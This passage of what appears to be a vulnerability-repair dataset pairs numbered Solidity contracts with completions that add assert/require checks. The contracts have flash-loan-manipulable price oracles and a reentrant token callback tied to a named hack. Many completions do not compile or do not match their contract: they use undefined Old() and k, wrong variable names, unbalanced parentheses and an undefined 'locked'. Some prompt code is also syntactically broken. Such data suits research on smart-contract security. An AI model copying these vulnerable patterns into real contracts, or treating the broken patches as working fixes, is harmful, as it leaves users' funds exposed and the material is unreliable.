MINIMUM_LIQUIDITY() external pure returns (uint);\n44     function factory() external view returns (address);\n45     function token0() external view returns (address);\n46     function token1() external view returns (address);\n47     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n48     function price0CumulativeLast() external view returns (uint);\n49     function price1CumulativeLast() external view returns (uint);\n50     function kLast() external view returns (uint);\n\n51     function mint(address to) external returns (uint liquidity);\n52     function burn(address to) external returns (uint amount0, uint amount1);\n53     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n54     function skim(address to) external;\n55     function sync() external;\n\n56     function initialize(address, address) external;\n57 }\n\n58 contract ExchangeTokens {\n59         IERC20 public WETH;\n60         IERC20 public USDC;\n61         IUniswapV2Pair public pair; \n62         mapping(address => uint) public debt;\n63         mapping(address => uint) public collateral;\n\n64         function liquidate(address user) public {\n65             uint dAmount = debt[user];\n66             uint cAmount = collateral[user];\n67             require(getPrice() * cAmount * 80 / 100 < dAmount,\n68             \"the given user\u2019s fund cannot be liquidated\");\n69             address _this = address(this);\n70             USDC.transferFrom(msg.sender, _this, dAmount);\n71             WETH.transferFrom(_this, msg.sender, cAmount);\n72         }\n73         function  getPrice() public payable returns (uint) {\n                 \n74             return (USDC.balanceOf(address(pair)) /\n75             WETH.balanceOf(address(pair)));\n76      }\n77  }",
        "completion": "63+ assert(Old(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair))) == USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)));\n73+ require(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)) <= Old(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)) * k, \"watch out for flashloan attack!\");\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.5.0;\n3 \n4  contract Swap {\n5          IERC20 public WEI;\n6          IERC20 public USD;\n7          IUniswapV2Pair public pair; \n8          mapping(address => uint) public debt;\n9          mapping(address => uint) public collateral;\n10 \n11          function liquidate(address user) public {\n12              uint dAmount = debt[user];\n13              uint cAmount = collateral[user];\n14             require(getPrice() * cAmount * 80 / 100 < dAmount,\n15              \"the given user\u2019s fund cannot be liquidated\");\n16             address _this = address(this);\n17            USD.transferFrom(msg.sender, _this, dAmount);\n18             WEI.transferFrom(_this, msg.sender, cAmount);\n19        }\n20          function  calculatePrice() public payable returns (uint) { \n21 \n22 \n23                     return (USD.balanceOf(address(pair)) /\n24              WEI.balanceOf(address(pair)));\n25      }\n26   }",
        "completion": "13+ assert(Old(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair))) == USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)));\n23+ require(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)) <= Old(USDC.balanceOf(address(pair)) /\n            WETH.balanceOf(address(pair)) * k, \"watch out for flashloan attack\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity 0.8.4;\n3 import \"./IOracle.sol\";\n4 \n5 \n6 interface IAggregator {\n7     function latestAnswer() external view returns (int256 answer);\n8 }\n9 \n10 interface IJoePair {\n11     function getReserves() external view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n12     function totalSupply() external view returns (uint256);\n13 }\n14 \n15 contract JLPWAVAXUSDCOracle is IOracle {\n16     IJoePair constant public joePair = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);\n17     IAggregator constant public AVAX = IAggregator(0x0A77230d17318075983913bC2145DB16C7366156);\n18     IAggregator constant public USDC = IAggregator(0xF096872672F44d6EBA71458D74fe67F9a77a23B9);\n19 \n20     function _get() internal view returns (uint256) {\n21 \n22         uint256 usdcPrice = uint256(USDC.latestAnswer());\n23         uint256 avaxPrice = uint256(AVAX.latestAnswer());\n24         (uint112 wavaxReserve, uint112 usdcReserve, ) = joePair.getReserves();\n25 \n26         uint256 price = (wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply());\n27 \n28         return 1e26 / price;\n29     }\n30 }",
        "completion": "24+ assert(Old((wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply())) == price);\n26+ require(price <= Old((wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply())) *k, \"watch out for flashloan attacks\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity 0.8.4;\n3 import \"./IOracle.sol\";\n4 \n5 \n6 interface IAggregator {\n7     function latestAnswer() external view returns (int256 answer);\n8 }\n9 \n10 interface IJoePair {\n11     function getReserves() external view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n12     function totalSupply() external view returns (uint256);\n13 }\n14 \n15 contract JLPWAVAXUSDCOracle is IOracle {\n16     IJoePair constant public joePair = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);\n17     IAggregator constant public AVAX = IAggregator(0x0A77230d17318075983913bC2145DB16C7366156);\n18     IAggregator constant public USDC = IAggregator(0xF096872672F44d6EBA71458D74fe67F9a77a23B9);\n19 \n20     function _get() internal view returns (uint256) {\n21 \n22         uint256 usdcPrice = uint256(USDC.latestAnswer());\n23         uint256 avaxPrice = uint256(AVAX.latestAnswer());\n24         (uint112 wavaxReserve, uint112 usdcReserve, ) = joePair.getReserves();\n25 \n26         uint256 price = (wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply());\n27 \n28         return 1e26 / price;\n29     }\n30 \n31    function get(bytes calldata) public view override returns (bool, uint256) {\n32         return (true, _get());\n33     }\n34 \n35 \n36     function peek(bytes calldata) public view override returns (bool, uint256) {\n37         return (true, _get());\n38     }\n39 \n40     function peekSpot(bytes calldata data) external view override returns (uint256 rate) {\n41         (, rate) = peek(data);\n42     }\n43 }",
        "completion": "24+ assert(Old((wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply())) == price);\n26+ require(price <= Old((wavaxReserve * avaxPrice + usdcReserve * usdcPrice * 1e12) / uint256(joePair.totalSupply())) *k, \"watch out for flashloan attacks\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 \n3 pragma solidity 0.6.12;\n4 \n5 import \"@openzeppelin/contracts/math/SafeMath.sol\";\n6 import \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\n7 import \"../LPToken.sol\";\n8 import \"../interfaces/ISwap.sol\";\n9 import \"../MathUtils.sol\";\n10 import \"../SwapUtils.sol\";\n11 \n12 \n13 library MetaSwapUtils {\n14     using SafeERC20 for IERC20;\n15     using SafeMath for uint256;\n16     using MathUtils for uint256;\n17     using AmplificationUtils for SwapUtils.Swap;\n18 \n19     /*** EVENTS ***/\n20 \n21     event TokenSwap(\n22         address indexed buyer,\n23         uint256 tokensSold,\n24         uint256 tokensBought,\n25         uint128 soldId,\n26         uint128 boughtId\n27     );\n28     event TokenSwapUnderlying(\n29         address indexed buyer,\n30         uint256 tokensSold,\n31         uint256 tokensBought,\n32         uint128 soldId,\n33         uint128 boughtId\n34     );\n35     event AddLiquidity(\n36         address indexed provider,\n37         uint256[] tokenAmounts,\n38         uint256[] fees,\n39         uint256 invariant,\n40         uint256 lpTokenSupply\n41     );\n42     event RemoveLiquidityOne(\n43         address indexed provider,\n44         uint256 lpTokenAmount,\n45         uint256 lpTokenSupply,\n46         uint256 boughtId,\n47         uint256 tokensBought\n48     );\n49     event RemoveLiquidityImbalance(\n50         address indexed provider,\n51         uint256[] tokenAmounts,\n52         uint256[] fees,\n53         uint256 invariant,\n54         uint256 lpTokenSupply\n55     );\n56     event NewAdminFee(uint256 newAdminFee);\n57     event NewSwapFee(uint256 newSwapFee);\n58     event NewWithdrawFee(uint256 newWithdrawFee);\n59 \n60     struct MetaSwap {\n61         ISwap baseSwap;\n62         uint256 baseVirtualPrice;\n63         uint256 baseCacheLastUpdated;\n64         IERC20[] baseTokens;\n65     }\n66 \n67     struct CalculateWithdrawOneTokenDYInfo {\n68         uint256 d0;\n69         uint256 d1;\n70         uint256 newY;\n71         uint256 feePerToken;\n72         uint256 preciseA;\n73         uint256 xpi;\n74     }\n75 \n76     struct ManageLiquidityInfo {\n77         uint256 d0;\n78         uint256 d1;\n79         uint256 d2;\n80         LPToken lpToken;\n81         uint256 totalSupply;\n82         uint256 preciseA;\n83         uint256 baseVirtualPrice;\n84         uint256[] tokenPrecisionMultipliers;\n85         uint256[] newBalances;\n86     }\n87 \n88     struct SwapUnderlyingInfo {\n89         uint256 x;\n90         uint256 dx;\n91         uint256 dy;\n92         uint256[] tokenPrecisionMultipliers;\n93         uint256[] oldBalances;\n94         IERC20[] baseTokens;\n95         IERC20 tokenFrom;\n96         uint8 metaIndexFrom;\n97         IERC20 tokenTo;\n98         uint8 metaIndexTo;\n99         uint256 baseVirtualPrice;\n100     }\n101 \n102     struct CalculateSwapUnderlyingInfo {\n103         uint256 baseVirtualPrice;\n104         ISwap baseSwap;\n105         uint8 baseLPTokenIndex;\n106         uint8 baseTokensLength;\n107         uint8 metaIndexTo;\n108         uint256 x;\n109         uint256 dy;\n110     }\n111 \n112     uint256 private constant FEE_DENOMINATOR = 10**10;\n113     uint256 public constant BASE_CACHE_EXPIRE_TIME = 10 minutes;\n114     uint256 public constant BASE_VIRTUAL_PRICE_PRECISION = 10**18;\n115 \n116     function _calculateWithdrawOneTokenDY(\n117         SwapUtils.Swap storage self,\n118         uint8 tokenIndex,\n119         uint256 tokenAmount,\n120         uint256 baseVirtualPrice,\n121         uint256 totalSupply\n122     )\n123         internal\n124         view\n125         returns (\n126             uint256,\n127             uint256,\n128             uint256\n129         )\n130     {\n131         // Get the current D, then solve the stableswap invariant\n132         // y_i for D - tokenAmount\n133         uint256[] memory xp = _xp(self, baseVirtualPrice);\n134         require(tokenIndex < xp.length, \"Token index out of range\");\n135 \n136         CalculateWithdrawOneTokenDYInfo memory v =\n137             CalculateWithdrawOneTokenDYInfo(0, 0, 0, 0, self._getAPrecise(), 0);\n138         v.d0 = SwapUtils.getD(xp, v.preciseA);\n139         v.d1 = v.d0.sub(tokenAmount.mul(v.d0).div(totalSupply));\n140 \n141         require(tokenAmount <= xp[tokenIndex], \"Withdraw exceeds available\");\n142 \n143         v.newY = SwapUtils.getYD(v.preciseA, tokenIndex, xp, v.d1);\n144 \n145         uint256[] memory xpReduced = new uint256[](xp.length);\n146 \n147         v.feePerToken = SwapUtils._feePerToken(self.swapFee, xp.length);\n148         for (uint256 i = 0; i < xp.length; i++) {\n149             v.xpi = xp[i];\n150             xpReduced[i] = v.xpi.sub(\n151                 (\n152                     (i == tokenIndex)\n153                         ? v.xpi.mul(v.d1).div(v.d0).sub(v.newY)\n154                         : v.xpi.sub(v.xpi.mul(v.d1).div(v.d0))\n155                 )\n156                     .mul(v.feePerToken)\n157                     .div(FEE_DENOMINATOR)\n158             );\n159         }\n160         uint256 dy =\n161             xpReduced[tokenIndex].sub(\n162                 SwapUtils.getYD(v.preciseA, tokenIndex, xpReduced, v.d1)\n163             );\n164 \n165         if (tokenIndex == xp.length.sub(1)) {\n166             dy = dy.mul(BASE_VIRTUAL_PRICE_PRECISION).div(baseVirtualPrice);\n167         }\n168         dy = dy.sub(1).div(self.tokenPrecisionMultipliers[tokenIndex]);\n169 \n170         return (dy, v.newY, xp[tokenIndex]);\n171     }\n172 \n173     function calculateSwap(\n174         SwapUtils.Swap storage self,\n175         MetaSwap storage metaSwapStorage,\n176         uint8 tokenIndexFrom,\n177         uint8 tokenIndexTo,\n178         uint256 dx\n179     ) external view returns (uint256 dy) {\n180         (dy, ) = _calculateSwap(\n181             self,\n182             tokenIndexFrom,\n183             tokenIndexTo,\n184             dx,\n185             _getBaseVirtualPrice(metaSwapStorage)\n186         );\n187     }\n188 \n189 //this is the buggy function\n190     function _calculateSwap(\n191         SwapUtils.Swap storage self,\n192         uint8 tokenIndexFrom,\n193         uint8 tokenIndexTo,\n194         uint256 dx,\n195         uint256 baseVirtualPrice\n196     ) internal view returns (uint256 dy, uint256 dyFee) {\n197         uint256[] memory xp = _xp(self, baseVirtualPrice);\n198         require(\n199             tokenIndexFrom < xp.length && tokenIndexTo < xp.length,\n200             \"Token index out of range\"\n201         );\n202         uint256 x =\n203             dx.mul(self.tokenPrecisionMultipliers[tokenIndexFrom]).add(\n204                 xp[tokenIndexFrom]\n205             );\n206         uint256 y =\n207             SwapUtils.getY(\n208                 self._getAPrecise(),\n209                 tokenIndexFrom,\n210                 tokenIndexTo,\n211                 x,\n212                 xp\n213             );\n214         dy = xp[tokenIndexTo].sub(y).sub(1);\n215         dyFee = dy.mul(self.swapFee).div(FEE_DENOMINATOR);\n216         dy = dy.sub(dyFee).div(self.tokenPrecisionMultipliers[tokenIndexTo]);\n217     }\n218  \n219 }",
        "completion": "110+ assert(Old(CalculateSwapUnderlyingInfo.dy) == dy);\n186+ require(dy <= k*Old(CalculateSwapUnderlyingInfo.dy, \"watch out for flashloan attacks!\"));\n"
    },
    {
        "prompt": "//hundred finance hack\n1 pragma solidity ^0.4.11;\n2 \n3 \n4 import \"./token/ERC677.sol\";\n5 import \"./token/ERC677Receiver.sol\";\n6 \n7 \n8 contract ERC677Token is ERC677 {\n9 \n10   function transferAndCall(address _to, uint _value, bytes _data)\n11     public\n12     returns (bool success)\n13   {\n14     super.transfer(_to, _value);\n15     Transfer(msg.sender, _to, _value, _data);\n16     if (isContract(_to)) {\n17       contractFallback(_to, _value, _data);\n18     }\n19     return true;\n20   }\n21 \n22 \n23   // PRIVATE\n24 \n25   function contractFallback(address _to, uint _value, bytes _data)\n26     private\n27   {\n28     ERC677Receiver receiver = ERC677Receiver(_to);\n29     receiver.onTokenTransfer(msg.sender, _value, _data);\n30   }\n31 \n32   function isContract(address _addr)\n33     private\n34     returns (bool hasCode)\n35   {\n36     uint length;\n37     assembly { length := extcodesize(_addr) }\n38     return length > 0;\n39   }\n40 \n41 }\n42 \n43 contract Ctoken{\n44     function transfer(address _to, uint256 _value) public returns (bool) {\n45         require(super. Transfer(_to, _value));\n46         callAfterTransfer(msg.sender, _to, _value);\n47         return true;\n48     }\n49  \n50  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n51         require(super.transferFrom(_from, _to, _value));\n52         callAfterTransfer(_from, _to, _value);\n53         return true;\n54     }\n55  \n56  function callAfterTransfer(address _from, address _to, uint256 _value) internal {\n57         if (AddressUtils.isContract(_to) && !contractFallback(_from, _to, _value, new bytes(0))) {\n58             require(!isBridge(_to));\n59             emit ContractFallbackCallFailed(_from, _to, _value);\n60         }\n61     }\n62  \n63  function isBridge(address _address) public view returns (bool) {\n64         return _address == bridgeContractAddr;\n65     }\n66  \n67  \n68  function contractFallback(address _from, address _to, uint256 _value, bytes _data) private returns (bool) {\n69         return _to.call(abi.encodeWithSelector(ON_TOKEN_TRANSFER, _from, _value, _data));\n70     }\n71 }",
        "completion": "44+ assert(locked==true);\n50+ assert(locked==true);\n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n2 \n3 \n4 import \"./token/ERC677.sol\";\n5 import \"./token/ERC677Receiver.sol\";\n6 \n7 \n8 contract ERC677Token is ERC677 {\n9 \n10   function transferAndCall(address _to, uint _value, bytes _data)\n11     public\n12     returns (bool success)\n13   {\n14     super.transfer(_to, _value);\n15     Transfer(msg.sender, _to, _value, _data);\n16     if (isContract(_to)) {\n17       contractFallback(_to, _value, _data);\n18     }\n19     return true;\n20   }\n21 \n22 \n23   // PRIVATE\n24 \n25   function contractFallback(address _to, uint _value, bytes _data)\n26     private\n27   {\n28     ERC677Receiver receiver = ERC677Receiver(_to);\n29     receiver.onTokenTransfer(msg.sender, _value, _data);\n30   }\n31 \n32   function isContract(address _addr)\n33     private\n34     returns (bool hasCode)\n35   {\n36     uint length;\n37     assembly { length := extcodesize(_addr) }\n38     return length > 0;\n39   }\n40 \n41 }\n42 \n43 contract Ctoken{\n44     function transfer(address _to, uint256 _value) public returns (bool) {\n45         require(superTransfer(_to, _value));\n46         callAfterTransfer(msg.sender, _to, _value);\n47         return true;\n48     }\n49  \n50  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n51         require(super.transferFrom(_from, _to, _value));\n52         callAfterTransfer(_from, _to, _value);\n53         return true;\n54     }\n55  \n56  function callAfterTransfer(address _from, address _to, uint256 _value) internal {\n57         if (AddressUtils.isContract(_to) && !contractFallback(_from, _to, _value, new bytes(0))) {\n58             require(!isBridge(_to));\n59             emit ContractFallbackCallFailed(_from, _to, _value);\n60         }\n61     }\n62  \n63  function isBridge(address _address) public view returns (bool) {\n64         return _address == bridgeContractAddr;\n65     }\n66  \n67  \n68  function contractFallback(address _from, address _to, uint256 _value, bytes _data) private returns (bool) {\n69         return _to.call(abi.encodeWithSelector(ON_TOKEN_TRANSFER, _from, _value, _data));\n70     }\n71 }",
        "completion": "44+ assert(locked==true);\n50+ assert(locked==true);\n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n2 \n3 \n4 contract Ctoken{\n5     function transfer(address _to, uint256 _value) public returns (bool) {\n6         require(superTransfer(_to, _value));\n7         callAfterTransfer(msg.sender, _to, _value);\n8         return true;\n9     }\n10  \n11  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n12         require(super.transferFrom(_from, _to, _value));\n13         callAfterTransfer(_from, _to, _value);\n14         return true;\n15     }\n16  \n17  \n18  function contractFallback(address _from, address _to, uint256 _value, bytes _data) private returns (bool) {\n19         return _to.call(abi.encodeWithSelector(ON_TOKEN_TRANSFER, _from, _value, _data));\n20     }\n21 }",
        "completion": "5+ assert(locked==true);\n11+ assert(locked==true);\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 \n3 pragma solidity ^0.8.0;\n4 \n5 contract WUSDMaster{\n6 \n7         function stake(uint256 amount) external nonReentrant {\n8         require(amount <= maxStakeAmount, 'amount too high');\n9         usdt.safeTransferFrom(msg.sender, address(this), amount);\n10         if(feePermille > 0) {\n11             uint256 feeAmount = amount * feePermille / 1000;\n12             usdt.safeTransfer(treasury, feeAmount);\n13             amount = amount - feeAmount;\n14         }\n15         uint256 wexAmount = amount * wexPermille / 1000;\n16         usdt.approve(address(wswapRouter), wexAmount);\n17         wswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n18             wexAmount,\n19             0,\n20             swapPath,\n21             address(this),\n22             block.timestamp\n23         );\n24         wusd.mint(msg.sender, amount);\n25         \n26         emit Stake(msg.sender, amount);\n27     }\n28 \n29 }",
        "completion": "8+ assert(Old(usdt.balanceOf(address(this))) == usdt.balanceOf(address(this)));\n14+ require(usdt.balanceOf(address(this)) <= Old(usdt.balanceOf(address(this))) *k, \"watch out for flashloan attacks!\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.8.0;\n3 \n4 contract WUSDMaster is Ownable, Withdrawable, ReentrancyGuard {\n5     using SafeERC20 for IERC20;\n6     \n7     IWUSD public immutable wusd;\n8     IERC20 public usdt;\n9     IERC20 public wex;\n10     IWswapRouter public immutable wswapRouter;\n11     address public treasury;\n12     address public strategist;\n13     \n14     address[] public swapPath;\n15     \n16     uint public wexPermille = 100;\n17     uint public treasuryPermille = 7;\n18     uint public feePermille = 0;\n19     \n20     uint256 public maxStakeAmount;\n21     \n22     event Stake(address indexed user, uint256 amount);\n23     event Redeem(address indexed user, uint256 amount);\n24     event UsdtWithdrawn(uint256 amount);\n25     event WexWithdrawn(uint256 amount);\n26     event SwapPathChanged(address[] swapPath);\n27     event WexPermilleChanged(uint256 wexPermille);\n28     event TreasuryPermilleChanged(uint256 treasuryPermille);\n29     event FeePermilleChanged(uint256 feePermille);\n30     event TreasuryAddressChanged(address treasury);\n31     event StrategistAddressChanged(address strategist);\n32     event MaxStakeAmountChanged(uint256 maxStakeAmount);\n33     \n34     constructor(IWUSD _wusd, IERC20 _usdt, IERC20 _wex, IWswapRouter _wswapRouter, address _treasury, uint256 _maxStakeAmount) {\n35         require(\n36             address(_wusd) != address(0) &&\n37             address(_usdt) != address(0) &&\n38             address(_wex) != address(0) &&\n39             address(_wswapRouter) != address(0) &&\n40             _treasury != address(0),\n41             \"zero address in constructor\"\n42         );\n43         wusd = _wusd;\n44         usdt = _usdt;\n45         wex = _wex;\n46         wswapRouter = _wswapRouter;\n47         treasury = _treasury;\n48         swapPath = [address(usdt), address(wex)];\n49         maxStakeAmount = _maxStakeAmount;\n50     }\n51     \n52     function stake(uint256 amount) external nonReentrant {\n53         require(amount <= maxStakeAmount, 'amount too high');\n54         usdt.safeTransferFrom(msg.sender, address(this), amount);\n55         if(feePermille > 0) {\n56             uint256 feeAmount = amount * feePermille / 1000;\n57             usdt.safeTransfer(treasury, feeAmount);\n58             amount = amount - feeAmount;\n59         }\n60         uint256 wexAmount = amount * wexPermille / 1000;\n61         usdt.approve(address(wswapRouter), wexAmount);\n62         wswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n63             wexAmount,\n64             0,\n65             swapPath,\n66             address(this),\n67             block.timestamp\n68         );\n69         wusd.mint(msg.sender, amount);\n70         \n71         emit Stake(msg.sender, amount);\n72     }\n73 }",
        "completion": "53+ assert(Old(usdt.balanceOf(address(this))) == usdt.balanceOf(address(this)));\n59+ require(usdt.balanceOf(address(this)) <= Old(usdt.balanceOf(address(this))) *k,  \"watchout for flashloan attacks!\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.6.12;\n3 pragma experimental ABIEncoderV2;\n4 \n5 \n6 \n7 contract PancakeSwap is IStrategy, RewardsDistributionRecipient, ReentrancyGuard, Pausable {\n8     using SafeMath for uint256;\n9     using SafeBEP20 for IBEP20;\n10 \n11  \n12     ICakeVault public rewardsToken;\n13     IBEP20 public stakingToken;\n14     uint256 public periodFinish = 0;\n15     uint256 public rewardRate = 0;\n16     uint256 public rewardsDuration = 2 hours;\n17     uint256 public lastUpdateTime;\n18     uint256 public rewardPerTokenStored;\n19 \n20     mapping(address => uint256) public userRewardPerTokenPaid;\n21     mapping(address => uint256) public rewards;\n22 \n23     uint256 private _totalSupply;\n24     mapping(address => uint256) private _balances;\n25 \n26     address private constant CAKE = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;\n27     IMasterChef private constant CAKE_MASTER_CHEF = IMasterChef(0x73feaa1eE314F8c655E354234017bE2193C9E24E);\n28     uint public poolId;\n29     address public keeper = 0x793074D9799DC3c6039F8056F1Ba884a73462051;\n30     mapping (address => uint) public depositedAt;\n31 \n32 \n33     IStrategyHelper public helper = IStrategyHelper(0x154d803C328fFd70ef5df52cb027d82821520ECE);\n34     IBunnyMinter public minter;\n35 \n36 \n37 \n38     constructor(uint _pid) public {\n39         (address _token,,,) = CAKE_MASTER_CHEF.poolInfo(_pid);\n40         stakingToken = IBEP20(_token);\n41         stakingToken.safeApprove(address(CAKE_MASTER_CHEF), uint(~0));\n42         poolId = _pid;\n43 \n44         rewardsDistribution = msg.sender;\n45         setMinter(IBunnyMinter(0x0B4A714AAf59E46cb1900E3C031017Fd72667EfE));\n46         setRewardsToken(0x9a8235aDA127F6B5532387A029235640D1419e8D);\n47     }\n48 \n49     function totalSupply() external view returns (uint256) {\n50         return _totalSupply;\n51     }\n52 \n53     function balance() override external view returns (uint) {\n54         return _totalSupply;\n55     }\n56 \n57     function balanceOf(address account) override external view returns (uint256) {\n58         return _balances[account];\n59     }\n60 \n61     function principalOf(address account) override external view returns (uint256) {\n62         return _balances[account];\n63     }\n64 \n65     function withdrawableBalanceOf(address account) override public view returns (uint) {\n66         return _balances[account];\n67     }\n68 \n69     function profitOf(address account) override public view returns (uint _usd, uint _bunny, uint _bnb) {\n70         uint cakeVaultPrice = rewardsToken.priceShare();\n71         uint _earned = earned(account);\n72         uint amount = _earned.mul(cakeVaultPrice).div(1e18);\n73 \n74         if (address(minter) != address(0) && minter.isMinter(address(this))) {\n75             uint performanceFee = minter.performanceFee(amount);\n76             // cake amount\n77             _usd = amount.sub(performanceFee);\n78 \n79             uint bnbValue = helper.tvlInBNB(CAKE, performanceFee);\n80             // bunny amount\n81             _bunny = minter.amountBunnyToMint(bnbValue);\n82         } else {\n83             _usd = amount;\n84             _bunny = 0;\n85         }\n86 \n87         _bnb = 0;\n88     }\n89 \n90     function tvl() override public view returns (uint) {\n91         uint stakingTVL = helper.tvl(address(stakingToken), _totalSupply);\n92 \n93         uint price = rewardsToken.priceShare();\n94         uint earned = rewardsToken.balanceOf(address(this)).mul(price).div(1e18);\n95         uint rewardTVL = helper.tvl(CAKE, earned);\n96 \n97         return stakingTVL.add(rewardTVL);\n98     }\n99 \n100     function tvlStaking() external view returns (uint) {\n101         return helper.tvl(address(stakingToken), _totalSupply);\n102     }\n103 \n104     function tvlReward() external view returns (uint) {\n105         uint price = rewardsToken.priceShare();\n106         uint earned = rewardsToken.balanceOf(address(this)).mul(price).div(1e18);\n107         return helper.tvl(CAKE, earned);\n108     }\n109 \n110     function apy() override public view returns(uint _usd, uint _bunny, uint _bnb) {\n111         uint dailyAPY = helper.compoundingAPY(poolId, 365 days).div(365);\n112 \n113         uint cakeAPY = helper.compoundingAPY(0, 1 days);\n114         uint cakeDailyAPY = helper.compoundingAPY(0, 365 days).div(365);\n115 \n116     \n117 \n118         _usd = dailyAPY.mul(cakeAPY).div(cakeDailyAPY);\n119         _bunny = 0;\n120         _bnb = 0;\n121     }\n122 \n123     function lastTimeRewardApplicable() public view returns (uint256) {\n124         return Math.min(block.timestamp, periodFinish);\n125     }\n126 \n127     function rewardPerToken() public view returns (uint256) {\n128         if (_totalSupply == 0) {\n129             return rewardPerTokenStored;\n130         }\n131         return\n132         rewardPerTokenStored.add(\n133             lastTimeRewardApplicable().sub(lastUpdateTime).mul(rewardRate).mul(1e18).div(_totalSupply)\n134         );\n135     }\n136 \n137     function earned(address account) public view returns (uint256) {\n138         return _balances[account].mul(rewardPerToken().sub(userRewardPerTokenPaid[account])).div(1e18).add(rewards[account]);\n139     }\n140 \n141     function getRewardForDuration() external view returns (uint256) {\n142         return rewardRate.mul(rewardsDuration);\n143     }\n144 \n145     function _deposit(uint256 amount, address _to) private nonReentrant notPaused updateReward(_to) {\n146         require(amount > 0, \"amount\");\n147         _totalSupply = _totalSupply.add(amount);\n148         _balances[_to] = _balances[_to].add(amount);\n149         depositedAt[_to] = block.timestamp;\n150         stakingToken.safeTransferFrom(msg.sender, address(this), amount);\n151         CAKE_MASTER_CHEF.deposit(poolId, amount);\n152         emit Staked(_to, amount);\n153 \n154         _harvest();\n155     }\n156 \n157     function deposit(uint256 amount) override public {\n158         _deposit(amount, msg.sender);\n159     }\n160 \n161     function depositAll() override external {\n162         deposit(stakingToken.balanceOf(msg.sender));\n163     }\n164 \n165     function withdraw(uint256 amount) override public nonReentrant updateReward(msg.sender) {\n166         require(amount > 0, \"amount\");\n167         _totalSupply = _totalSupply.sub(amount);\n168         _balances[msg.sender] = _balances[msg.sender].sub(amount);\n169         CAKE_MASTER_CHEF.withdraw(poolId, amount);\n170 \n171         if (address(minter) != address(0) && minter.isMinter(address(this))) {\n172             uint _depositedAt = depositedAt[msg.sender];\n173             uint withdrawalFee = minter.withdrawalFee(amount, _depositedAt);\n174             if (withdrawalFee > 0) {\n175                 uint performanceFee = withdrawalFee.div(100);\n176                 minter.mintFor(address(stakingToken), withdrawalFee.sub(performanceFee), performanceFee, msg.sender, _depositedAt);\n177                 amount = amount.sub(withdrawalFee);\n178             }\n179         }\n180 \n181         stakingToken.safeTransfer(msg.sender, amount);\n182         emit Withdrawn(msg.sender, amount);\n183 \n184         _harvest();\n185     }\n186 \n187     function withdrawAll() override external {\n188         uint _withdraw = withdrawableBalanceOf(msg.sender);\n189         if (_withdraw > 0) {\n190             withdraw(_withdraw);\n191         }\n192         getReward();\n193     }\n194 \n195     function getReward() override public nonReentrant updateReward(msg.sender) {\n196         uint256 reward = rewards[msg.sender];\n197         if (reward > 0) {\n198             rewards[msg.sender] = 0;\n199             rewardsToken.withdraw(reward);\n200             uint cakeBalance = IBEP20(CAKE).balanceOf(address(this));\n201 \n202             if (address(minter) != address(0) && minter.isMinter(address(this))) {\n203                 uint performanceFee = minter.performanceFee(cakeBalance);\n204                 minter.mintFor(CAKE, 0, performanceFee, msg.sender, depositedAt[msg.sender]);\n205                 cakeBalance = cakeBalance.sub(performanceFee);\n206             }\n207 \n208             IBEP20(CAKE).safeTransfer(msg.sender, cakeBalance);\n209             emit RewardPaid(msg.sender, cakeBalance);\n210         }\n211     }\n212  }",
        "completion": "47+ assert(Old(stakingToken.balanceOf(msg.sender)) == stakingToken.balanceOf(msg.sender));\n181+ require(stakingToken.balanceOf(msg.sender)) <= Old(stakingToken.balanceOf(msg.sender) *k, \"watch out for flashloan attacks!\");\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3 \n4  contract Lottery {\n5 \n6          mapping (address => mapping(uint64 => uint))\n7          public tickets;\n8          uint64 winningId; \n9          bool drawingPhase; \n10          }\n11          function reset() external{\n12                 delete tickets;\n13                 winningId = 0; \n14                 drawingPhase = false;\n15         }\n16 \n17         function buy(uint64 id, uint amount) external {\n18             require(winningId == 0, \"already drawn\");\n19             receivePayment(msg.sender, amount),\n20             tickets[msg.sender][id] += amount;\n21             }\n22 \n23         function enterDrawingPhase() external {\n24                 drawingPhase = true;\n25         }\n26 \n27          function draw(uint64 id) external {\n28                  require(winningId == 0, \"already drawn\");\n29                  require(id != 0, \"invalid winning number\");\n30                  winningId = id;\n31          }\n32          function claimReward() external {\n33                 